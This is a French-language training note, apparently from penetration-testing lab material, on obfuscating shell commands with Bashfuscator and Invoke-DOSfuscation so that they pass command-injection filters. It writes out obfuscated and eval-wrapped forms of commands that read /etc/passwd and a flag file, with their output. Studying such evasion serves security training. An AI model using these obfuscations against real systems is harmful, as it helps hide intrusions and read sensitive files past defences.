# Outils d'Évasion pour l'Obfuscation des Commandes

## <mark style="color:red;">1.</mark> <mark style="color:red;"></mark><mark style="color:red;">**Outils pour Linux (Bashfuscator)**</mark>

<mark style="color:green;">**Installation et Configuration de Bashfuscator**</mark>

*   **Clone du dépôt GitHub** :

    ```bash
    git clone https://github.com/Bashfuscator/Bashfuscator
    cd Bashfuscator
    pip3 install setuptools==65
    python3 setup.py install --user
    ```
*   **Utilisation de Bashfuscator** : Bashfuscator est un outil qui permet d'obfusquer des commandes Bash en utilisant divers mutateurs et techniques.

    Exécution de la commande avec l'option `-c` pour spécifier la commande à obfusquer :

    ```bash
    /bashfuscator -c 'cat /etc/passwd'
    ```

    Exemple d'output obfusqué :

    ```bash
    ${*/+27\[X\(} ...SNIP...  ${*~}
    ```

<mark style="color:green;">**Personnalisation des Commandes Obfusquées**</mark>

Vous pouvez affiner l'obfuscation en utilisant des options supplémentaires comme `-s`, `-t`, et `--no-mangling` :

```bash
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

{% code overflow="wrap" fullWidth="true" %}
```bash
 "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
```
{% endcode %}

Cela permet d'exécuter la commande sans que le filtre ne la détecte, même si elle semble totalement obfusquée.

<mark style="color:green;">**Test de la Commande Obfusqué**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
```
{% endcode %}

Si l'obfuscation fonctionne, la commande exécutera correctement et affichera le contenu souhaité, par exemple :

```ruby
troot:x:0:0:root:/root:/bin/bash
```

***

## <mark style="color:red;">2.</mark> <mark style="color:red;"></mark><mark style="color:red;">**Outils pour Windows (DOSfuscation)**</mark>

<mark style="color:green;">**Installation et Configuration de DOSfuscation**</mark>

*   **Clone du dépôt GitHub** :

    ```powershell
    git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
    cd Invoke-DOSfuscation
    Import-Module .\Invoke-DOSfuscation.psd1
    ```

<mark style="color:green;">**Utilisation de DOSfuscation**</mark>

Une fois l'outil installé, il est interactif et vous permet de choisir des options pour obfusquer les commandes. Exemple d'utilisation pour obfusquer une commande de type `type` :

{% code overflow="wrap" fullWidth="true" %}
```powershell
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```
{% endcode %}

{% code overflow="wrap" fullWidth="true" %}
```ruby
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```
{% endcode %}

<mark style="color:green;">**Exécution de la Commande Obfusquée**</mark>

{% code overflow="wrap" fullWidth="true" %}
```powershell
C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```
{% endcode %}

La commande retournera le résultat attendu, par exemple :

```
test_flag
```
